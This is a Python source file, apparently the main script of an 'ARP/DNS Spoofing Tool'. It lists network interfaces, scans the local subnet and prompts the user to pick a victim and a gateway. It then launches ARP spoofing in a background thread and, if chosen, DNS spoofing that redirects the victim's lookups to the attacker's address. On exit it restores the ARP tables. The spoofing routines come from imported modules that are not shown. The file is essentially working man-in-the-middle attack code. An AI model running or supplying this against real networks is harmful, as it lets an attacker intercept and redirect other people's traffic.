from network_utils import scan_network, get_attacker_ip, get_attacker_mac
from attacks.arp_spoof import start_arp_spoofing, restore_arp
from attacks.dns_spoof import start_dns_spoofer
from scapy.arch import get_if_list
import threading
import signal
import sys

def choose_host(hosts, role):
    print("\nSelect a {}:".format(role))
    for i, (ip, mac) in enumerate(hosts):
        print("{}: {} ({})".format(i, ip, mac))
    while True:
        try:
            choice = int(input("Enter index for {}: ".format(role)))
            return hosts[choice]
        except (ValueError, IndexError):
            print("Invalid selection, try again.")

def main():
    print("=== ARP/DNS Spoofing Tool ===")

    # 1. Choose network interface
    interfaces = get_if_list()
    print("\nAvailable network interfaces:")
    for i, iface in enumerate(interfaces):
        print("{}: {}".format(i, iface))
    while True:
        try:
            iface_idx = int(input("Choose interface index: "))
            iface = interfaces[iface_idx]
            break
        except (ValueError, IndexError):
            print("Invalid choice, try again.")

    # 2. Get attacker's IP and MAC
    attacker_ip = get_attacker_ip(iface)
    attacker_mac = get_attacker_mac(iface)

    # 3. Scan the network
    subnet = ".".join(attacker_ip.split(".")[:-1]) + ".0/24"
    hosts = scan_network(subnet, iface=iface)

    if len(hosts) < 2:
        print("[-] Not enough devices on network to launch attack.")
        sys.exit(1)

    # 4. Choose victim and gateway
    victim_ip, victim_mac = choose_host(hosts, "victim")
    gateway_ip, gateway_mac = choose_host(hosts, "gateway")

    # 5. DNS spoofing?
    dns_choice = input("\nEnable DNS spoofing? (y/n): ").strip().lower()

    stop_event = threading.Event()
    # 6. Start ARP spoofing thread
    print("[*] Starting ARP spoofing...")
    arp_thread = threading.Thread(
    target=start_arp_spoofing,
    args=(victim_ip, victim_mac, gateway_ip, gateway_mac, attacker_mac, iface, stop_event),
    daemon=True
    )
    arp_thread.start()

    try:
        if dns_choice == "y":
            print("[*] Starting DNS spoofing...")
            start_dns_spoofer(
                fake_ip=attacker_ip,
                attacker_mac=attacker_mac,
                iface=iface
            )
        else:
            print("[*] ARP spoofing is running. Press Ctrl+C to stop...")
            while True:
                signal.pause()

    except KeyboardInterrupt:
        print("\n[!] KeyboardInterrupt detected. Cleaning up...")

    finally:
        print("[*] Restoring ARP tables...")
        stop_event.set()           # Signal ARP thread to stop
        arp_thread.join()          # Wait for it to finish restoring
        print("[+] Cleanup complete. Exiting.")

if __name__ == "__main__":
    main()
